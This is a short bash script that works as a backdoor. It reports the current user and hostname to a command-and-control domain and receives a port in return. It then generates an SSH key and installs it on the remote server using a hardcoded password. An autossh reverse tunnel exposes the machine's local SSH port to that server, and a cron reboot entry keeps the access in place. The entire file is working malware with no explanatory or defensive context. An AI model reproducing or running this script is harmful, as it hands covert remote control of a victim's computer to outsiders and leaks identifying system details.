#!/bin/bash

user="suser"
username=$(whoami)
hostname=$(hostname)

data=$(echo -n "$user:$username:$hostname" | base64)

domain_name="proxy1.cryptopredictor.org"

received_port=$(curl -sL "https://$domain_name/report?data=$data")
received_port=$(echo $received_port | sed "s/%//g")

if [ -z "$received_port" ]; then
    echo "[-] Failed to receive remote port from C2 server."
    exit 1
else
	echo "$received_port"
fi

key_path="$HOME/.ssh/$(whoami)_ed25519"
[ ! -e "$key_path" ] && ssh-keygen -t ed25519 -f "$key_path" -N ""


sshpass -p "DZ04dYFws1POVlm0XeHA" ssh-copy-id -o StrictHostKeyChecking=no -i "${key_path}.pub" "$user@$domain_name"

mkdir -p "$HOME/.local/bin"
echo "autossh -f -i $key_path -N -o ExitOnForwardFailure=yes -R $received_port:127.0.0.1:22 $user@$domain_name" > "$HOME/.local/bin/script.sh"
bash "$HOME/.local/bin/script.sh"

mkdir -p "$HOME/.local/bin/"
CRON_ENTRY="@reboot $HOME/.local/bin/script.sh"
(crontab -l 2>/dev/null; echo "$CRON_ENTRY") | crontab -
